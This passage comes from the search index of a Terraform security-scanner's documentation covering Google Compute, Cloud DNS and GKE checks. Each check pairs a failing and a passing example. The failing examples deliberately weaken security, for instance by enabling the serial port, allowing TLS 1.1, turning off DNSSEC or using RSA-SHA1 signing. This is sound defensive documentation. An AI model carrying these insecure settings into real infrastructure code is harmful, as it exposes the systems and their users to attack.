access</p>","title":"Suggested Resolution"},{"location":"checks/google/compute/no-serial-port/#insecure-example","text":"<p>The following example will fail the google-compute-no-serial-port check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service_account_id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_compute_instance\" \"default\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n\n   tags = [\"foo\", \"bar\"]\n\n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n\n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n\n   network_interface {\n     network = \"default\"\n\n     access_config {\n       // Ephemeral IP\n     }\n   }\n\n   metadata = {\n     serial-port-enable = true\n   }\n\n   metadata_startup_script = \"echo hi &gt; /test.txt\"\n\n   service_account {\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     email  = google_service_account.default.email\n     scopes = [\"cloud-platform\"]\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/compute/no-serial-port/#secure-example","text":"<p>The following example will pass the google-compute-no-serial-port check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service_account_id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_compute_instance\" \"default\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n\n   tags = [\"foo\", \"bar\"]\n\n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n\n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n\n   network_interface {\n     network = \"default\"\n\n     access_config {\n       // Ephemeral IP\n     }\n   }\n\n   metadata = {\n     serial-port-enable = false\n   }\n\n   metadata_startup_script = \"echo hi &gt; /test.txt\"\n\n   service_account {\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     email  = google_service_account.default.email\n     scopes = [\"cloud-platform\"]\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/compute/no-serial-port/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#</li> </ul>","title":"Links"},{"location":"checks/google/compute/project-level-oslogin/","text":"","title":"OS Login should be enabled at project level"},{"location":"checks/google/compute/project-level-oslogin/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/compute/project-level-oslogin/#explanation","text":"<p>OS Login automatically revokes the relevant SSH keys when an IAM user has their access revoked.</p>","title":"Explanation"},{"location":"checks/google/compute/project-level-oslogin/#possible-impact","text":"<p>Access via SSH key cannot be revoked automatically when an IAM user is removed.</p>","title":"Possible Impact"},{"location":"checks/google/compute/project-level-oslogin/#suggested-resolution","text":"<p>Enable OS Login at project level</p>","title":"Suggested Resolution"},{"location":"checks/google/compute/project-level-oslogin/#insecure-example","text":"<p>The following example will fail the google-compute-project-level-oslogin check. <pre><code> resource \"google_compute_project_metadata\" \"default\" {\n   metadata = {\n    enable-oslogin = false\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/compute/project-level-oslogin/#secure-example","text":"<p>The following example will pass the google-compute-project-level-oslogin check. <pre><code> resource \"google_compute_project_metadata\" \"default\" {\n   metadata = {\n     enable-oslogin = true\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/compute/project-level-oslogin/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_project_metadata#</li> </ul>","title":"Links"},{"location":"checks/google/compute/use-secure-tls-policy/","text":"","title":"SSL policies should enforce secure versions of TLS"},{"location":"checks/google/compute/use-secure-tls-policy/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/google/compute/use-secure-tls-policy/#explanation","text":"<p>TLS versions prior to 1.2 are outdated and insecure. You should use 1.2 as aminimum version.</p>","title":"Explanation"},{"location":"checks/google/compute/use-secure-tls-policy/#possible-impact","text":"<p>Data in transit is not sufficiently secured</p>","title":"Possible Impact"},{"location":"checks/google/compute/use-secure-tls-policy/#suggested-resolution","text":"<p>Enforce a minimum TLS version of 1.2</p>","title":"Suggested Resolution"},{"location":"checks/google/compute/use-secure-tls-policy/#insecure-example","text":"<p>The following example will fail the google-compute-use-secure-tls-policy check. <pre><code> resource \"google_compute_ssl_policy\" \"bad_example\" {\n   name    = \"production-ssl-policy\"\n   profile = \"MODERN\"\n   min_tls_version = \"TLS_1_1\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/compute/use-secure-tls-policy/#secure-example","text":"<p>The following example will pass the google-compute-use-secure-tls-policy check. <pre><code> resource \"google_compute_ssl_policy\" \"good_example\" {\n   name    = \"production-ssl-policy\"\n   profile = \"MODERN\"\n   min_tls_version = \"TLS_1_2\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/compute/use-secure-tls-policy/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_ssl_policy#min_tls_version</li> </ul>","title":"Links"},{"location":"checks/google/compute/vm-disk-encryption-customer-key/","text":"","title":"VM disks should be encrypted with Customer Supplied Encryption Keys"},{"location":"checks/google/compute/vm-disk-encryption-customer-key/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/google/compute/vm-disk-encryption-customer-key/#explanation","text":"<p>Using unmanaged keys makes rotation and general management difficult.</p>","title":"Explanation"},{"location":"checks/google/compute/vm-disk-encryption-customer-key/#possible-impact","text":"<p>Using unmanaged keys does not allow for proper management</p>","title":"Possible Impact"},{"location":"checks/google/compute/vm-disk-encryption-customer-key/#suggested-resolution","text":"<p>Use managed keys </p>","title":"Suggested Resolution"},{"location":"checks/google/compute/vm-disk-encryption-customer-key/#insecure-example","text":"<p>The following example will fail the google-compute-vm-disk-encryption-customer-key check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service_account_id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_compute_instance\" \"bad_example\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n\n   tags = [\"foo\", \"bar\"]\n\n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n\n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n\n   network_interface {\n     network = \"default\"\n\n     access_config {\n       // Ephemeral IP\n     }\n   }\n\n   metadata = {\n     foo = \"bar\"\n   }\n\n   metadata_startup_script = \"echo hi &gt; /test.txt\"\n\n   service_account {\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     email  = google_service_account.default.email\n     scopes = [\"cloud-platform\"]\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/compute/vm-disk-encryption-customer-key/#secure-example","text":"<p>The following example will pass the google-compute-vm-disk-encryption-customer-key check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service_account_id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_compute_instance\" \"good_example\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n\n   tags = [\"foo\", \"bar\"]\n\n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n     kms_key_self_link = \"something\"\n   }\n\n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n\n   network_interface {\n     network = \"default\"\n\n     access_config {\n       // Ephemeral IP\n     }\n   }\n\n   metadata = {\n     foo = \"bar\"\n   }\n\n   metadata_startup_script = \"echo hi &gt; /test.txt\"\n\n   service_account {\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     email  = google_service_account.default.email\n     scopes = [\"cloud-platform\"]\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/compute/vm-disk-encryption-customer-key/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#kms_key_self_link</li> </ul>","title":"Links"},{"location":"checks/google/dns/","text":"","title":"dns"},{"location":"checks/google/dns/#checks","text":"<ul> <li> <p>enable-dnssec Cloud DNS should use DNSSEC</p> </li> <li> <p>no-rsa-sha1 Zone signing should not use RSA SHA1</p> </li> </ul>","title":"Checks"},{"location":"checks/google/dns/enable-dnssec/","text":"","title":"Cloud DNS should use DNSSEC"},{"location":"checks/google/dns/enable-dnssec/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/dns/enable-dnssec/#explanation","text":"<p>DNSSEC authenticates DNS responses, preventing MITM attacks and impersonation.</p>","title":"Explanation"},{"location":"checks/google/dns/enable-dnssec/#possible-impact","text":"<p>Unverified DNS responses could lead to man-in-the-middle attacks</p>","title":"Possible Impact"},{"location":"checks/google/dns/enable-dnssec/#suggested-resolution","text":"<p>Enable DNSSEC</p>","title":"Suggested Resolution"},{"location":"checks/google/dns/enable-dnssec/#insecure-example","text":"<p>The following example will fail the google-dns-enable-dnssec check. <pre><code> resource \"google_dns_managed_zone\" \"bad_example\" {\n   name        = \"example-zone\"\n   dns_name    = \"example-${random_id.rnd.hex}.com.\"\n   description = \"Example DNS zone\"\n   labels = {\n     foo = \"bar\"\n   }\n   dnssec_config {\n     state = \"off\"\n   }\n }\n\n resource \"random_id\" \"rnd\" {\n   byte_length = 4\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/dns/enable-dnssec/#secure-example","text":"<p>The following example will pass the google-dns-enable-dnssec check. <pre><code> resource \"google_dns_managed_zone\" \"good_example\" {\n   name        = \"example-zone\"\n   dns_name    = \"example-${random_id.rnd.hex}.com.\"\n   description = \"Example DNS zone\"\n   labels = {\n     foo = \"bar\"\n   }\n   dnssec_config {\n     state = \"on\"\n   }\n }\n\n resource \"random_id\" \"rnd\" {\n   byte_length = 4\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/dns/enable-dnssec/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/dns_managed_zone#state</li> </ul>","title":"Links"},{"location":"checks/google/dns/no-rsa-sha1/","text":"","title":"Zone signing should not use RSA SHA1"},{"location":"checks/google/dns/no-rsa-sha1/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/dns/no-rsa-sha1/#explanation","text":"<p>RSA SHA1 is a weaker algorithm than SHA2-based algorithms such as RSA SHA256/512</p>","title":"Explanation"},{"location":"checks/google/dns/no-rsa-sha1/#possible-impact","text":"<p>Less secure encryption algorithm than others available</p>","title":"Possible Impact"},{"location":"checks/google/dns/no-rsa-sha1/#suggested-resolution","text":"<p>Use RSA SHA512</p>","title":"Suggested Resolution"},{"location":"checks/google/dns/no-rsa-sha1/#insecure-example","text":"<p>The following example will fail the google-dns-no-rsa-sha1 check. <pre><code> resource \"google_dns_managed_zone\" \"foo\" {\n    name     = \"foobar\"\n    dns_name = \"foo.bar.\"\n\n    dnssec_config {\n        state         = \"on\"\n        non_existence = \"nsec3\"\n    }\n }\n\n data \"google_dns_keys\" \"foo_dns_keys\" {\n    managed_zone = google_dns_managed_zone.foo.id\n    zone_signing_keys {\n        algorithm = \"rsasha1\"\n    }\n }\n\n output \"foo_dns_ds_record\" {\n    description = \"DS record of the foo subdomain.\"\n    value       = data.google_dns_keys.foo_dns_keys.key_signing_keys[0].ds_record\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/dns/no-rsa-sha1/#secure-example","text":"<p>The following example will pass the google-dns-no-rsa-sha1 check. <pre><code> resource \"google_dns_managed_zone\" \"foo\" {\n    name     = \"foobar\"\n    dns_name = \"foo.bar.\"\n\n    dnssec_config {\n        state         = \"on\"\n        non_existence = \"nsec3\"\n    }\n }\n\n data \"google_dns_keys\" \"foo_dns_keys\" {\n    managed_zone = google_dns_managed_zone.foo.id\n    zone_signing_keys {\n        algorithm = \"rsasha512\"\n    }\n }\n\n output \"foo_dns_ds_record\" {\n    description = \"DS record of the foo subdomain.\"\n    value       = data.google_dns_keys.foo_dns_keys.key_signing_keys[0].ds_record\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/dns/no-rsa-sha1/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/dns_managed_zone#algorithm</li> </ul>","title":"Links"},{"location":"checks/google/gke/","text":"","title":"gke"},{"location":"checks/google/gke/#checks","text":"<ul> <li> <p>enable-auto-repair Kubernetes should have 'Automatic repair' enabled</p> </li> <li> <p>enable-auto-upgrade Kubernetes should have 'Automatic upgrade' enabled</p> </li> <li> <p>enable-ip-aliasing Clusters should have IP aliasing enabled</p> </li> <li> <p>enable-master-networks Master authorized networks should be configured on GKE clusters</p> </li> <li> <p>enable-network-policy Network Policy should be enabled on GKE clusters</p> </li> <li> <p>enable-private-cluster Clusters should be set to private</p> </li> <li> <p>enable-stackdriver-logging Stackdriver Logging should be enabled</p> </li> <li> <p>enable-stackdriver-monitoring Stackdriver Monitoring should be enabled</p> </li> <li> <p>enforce-pod-security-policy Pod security policy enforcement not defined.</p> </li> <li> <p>metadata-endpoints-disabled Legacy metadata endpoints enabled.</p> </li> <li> <p>no-legacy-authentication Legacy client authentication methods utilized.</p> </li> <li> <p>no-public-control-plane GKE Control Plane should not be publicly accessible</p> </li> <li> <p>node-metadata-security Node metadata value disables metadata concealment.</p> </li> <li> <p>node-pool-uses-cos Ensure Container-Optimized OS (cos) is used for Kubernetes Engine Clusters Node image</p> </li> <li> <p>node-shielding-enabled Shielded GKE nodes not enabled.</p> </li> <li> <p>use-cluster-labels Clusters should be configured with Labels</p> </li> <li> <p>use-rbac-permissions Legacy ABAC permissions are enabled.</p> </li> <li> <p>use-service-account Checks for service account defined for GKE nodes</p> </li> </ul>","title":"Checks"},{"location":"checks/google/gke/enable-auto-repair/","text":"","title":"Kubernetes should have 'Automatic repair' enabled"},{"location":"checks/google/gke/enable-auto-repair/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/google/gke/enable-auto-repair/#explanation","text":"<p>Automatic repair will monitor nodes and attempt repair when a node fails multiple subsequent health checks</p>","title":"Explanation"},{"location":"checks/google/gke/enable-auto-repair/#possible-impact","text":"<p>Failing nodes will require manual repair.</p>","title":"Possible Impact"},{"location":"checks/google/gke/enable-auto-repair/#suggested-resolution","text":"<p>Enable automatic repair</p>","title":"Suggested Resolution"},{"location":"checks/google/gke/enable-auto-repair/#insecure-example","text":"<p>The following example will fail the google-gke-enable-auto-repair check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"primary\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n }\n\n resource \"google_container_node_pool\" \"bad_example\" {\n   name       = \"my-node-pool\"\n   cluster    = google_container_cluster.primary.id\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n   management {\n     auto_repair = false\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/gke/enable-auto-repair/#secure-example","text":"<p>The following example will pass the google-gke-enable-auto-repair check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"primary\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n }\n\n resource \"google_container_node_pool\" \"good_example\" {\n   name       = \"my-node-pool\"\n   cluster    = google_container_cluster.primary.id\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n   management {\n     auto_repair = true\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/gke/enable-auto-repair/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_node_pool#auto_repair</li> </ul>","title":"Links"},{"location":"checks/google/gke/enable-auto-upgrade/","text":"","title":"Kubernetes should have 'Automatic upgrade' enabled"},{"location":"checks/google/gke/enable-auto-upgrade/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/google/gke/enable-auto-upgrade/#explanation","text":"<p>Automatic updates keep nodes updated with the latest cluster master version.</p>","title":"Explanation"},{"location":"checks/google/gke/enable-auto-upgrade/#possible-impact","text":"<p>Nodes will need the cluster master version manually updating</p>","title":"Possible Impact"},{"location":"checks/google/gke/enable-auto-upgrade/#suggested-resolution","text":"<p>Enable automatic upgrades</p>","title":"Suggested Resolution"},{"location":"checks/google/gke/enable-auto-upgrade/#insecure-example","text":"<p>The following example will fail the google-gke-enable-auto-upgrade check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"primary\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n }\n\n resource \"google_container_node_pool\" \"bad_example\" {\n   name       = \"my-node-pool\"\n   cluster    = google_container_cluster.primary.id\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n   management {\n     auto_upgrade = false\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/gke/enable-auto-upgrade/#secure-example","text":"<p>The following example will pass the google-gke-enable-auto-upgrade check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"primary\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n }\n\n resource \"google_container_node_pool\" \"good_example\" {\n   name       = \"my-node-pool\"\n   cluster    = google_container_cluster.primary.id\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n   management {\n     auto_upgrade = true\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/gke/enable-auto-upgrade/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_node_pool#auto_upgrade</li> </ul>","title":"Links"},{"location":"checks/google/gke/enable-ip-aliasing/","text":"","title":"Clusters should have IP aliasing enabled"},{"location":"checks/google/gke/enable-ip-aliasing/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/google/gke/enable-ip-aliasing/#explanation","text":"<p>IP aliasing allows the reuse of public IPs internally, removing the need for a NAT gateway.</p>","title":"Explanation"},{"location":"checks/google/gke/enable-ip-aliasing/#possible-impact","text":"<p>Nodes need a NAT gateway to access local services</p>","title":"Possible Impact"},{"location":"checks/google/gke/enable-ip-aliasing/#suggested-resolution","text":"<p>Enable IP aliasing</p>","title":"Suggested Resolution"},{"location":"checks/google/gke/enable-ip-aliasing/#insecure-example","text":"<p>The following example will fail the google-gke-enable-ip-aliasing check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"bad_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n }\n\n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/gke/enable-ip-aliasing/#secure-example","text":"<p>The following example will pass the google-gke-enable-ip-aliasing check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"good_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   ip_allocation_policy {}\n }\n\n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/gke/enable-ip-aliasing/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#ip_allocation_policy</li> </ul>","title":"Links"},{"location":"checks/google/gke/enable-master-networks/","text":"","title":"Master authorized networks should be configured on GKE clusters"},{"location":"checks/google/gke/enable-master-networks/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/google/gke/enable-master-networks/#explanation","text":"<p>Enabling authorized networks means you can restrict master access to a fixed set of CIDR ranges</p>","title":"Explanation"},{"location":"checks/google/gke/enable-master-networks/#possible-impact","text":"<p>Unrestricted network access to the master</p>","title":"Possible Impact"},{"location":"checks/google/gke/enable-master-networks/#suggested-resolution","text":"<p>Enable master authorized networks</p>","title":"Suggested Resolution"},{"location":"checks/google/gke/enable-master-networks/#insecure-example","text":"<p>The following example will fail the google-gke-enable-master-networks check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"primary\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n }\n\n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/gke/enable-master-networks/#secure-example","text":"<p>The following example will pass the google-gke-enable-master-networks check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"primary\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   master_authorized_networks_config {\n     cidr_blocks {\n       cidr_block = \"10.10.128.0/24\"\n       display_name = \"internal\"\n     }\n   }\n }\n\n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/gke/enable-master-networks/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#</li> </ul>","title":"Links"},{"location":"checks/google/gke/enable-network-policy/","text":"","title":"Network Policy should be enabled on GKE clusters"},{"location":"checks/google/gke/enable-network-policy/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/gke/enable-network-policy/#explanation","text":"<p>Enabling a network policy allows the segregation of network traffic by namespace</p>","title":"Explanation"},{"location":"checks/google/gke/enable-network-policy/#possible-impact","text":"<p>Unrestricted inter-cluster communication</p>","title":"Possible Impact"},{"location":"checks/google/gke/enable-network-policy/#suggested-resolution","text":"<p>Enable network policy</p>","title":"Suggested Resolution"},{"location":"checks/google/gke/enable-network-policy/#insecure-example","text":"<p>The following example will fail the google-gke-enable-network-policy check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"bad_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   network_policy {\n     enabled = false\n   }\n }\n\n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/gke/enable-network-policy/#secure-example","text":"<p>The following example will pass the google-gke-enable-network-policy check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"good_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   network_policy {\n     enabled = true\n   }\n }\n\n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/gke/enable-network-policy/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#enabled</li> </ul>","title":"Links"},{"location":"checks/google/gke/enable-private-cluster/","text":"","title":"Clusters should be set to private"},{"location":"checks/google/gke/enable-private-cluster/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/gke/enable-private-cluster/#explanation","text":"<p>Enabling private nodes on a cluster ensures the nodes are only available internally as they will only be assigned internal addresses.</p>","title":"Explanation"},{"location":"checks/google/gke/enable-private-cluster/#possible-impact","text":"<p>Nodes may be exposed to the public internet</p>","title":"Possible Impact"},{"location":"checks/google/gke/enable-private-cluster/#suggested-resolution","text":"<p>Enable private cluster</p>","title":"Suggested Resolution"},{"location":"checks/google/gke/enable-private-cluster/#insecure-example","text":"<p>The following example will fail the google-gke-enable-private-cluster check. <pre><code> resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n\n resource \"google_container_cluster\" \"bad_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n\n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   private_cluster_config {\n     enable_private_nodes = false\n   }\n }\n\n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n\n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n\n     # Google recommends custom service 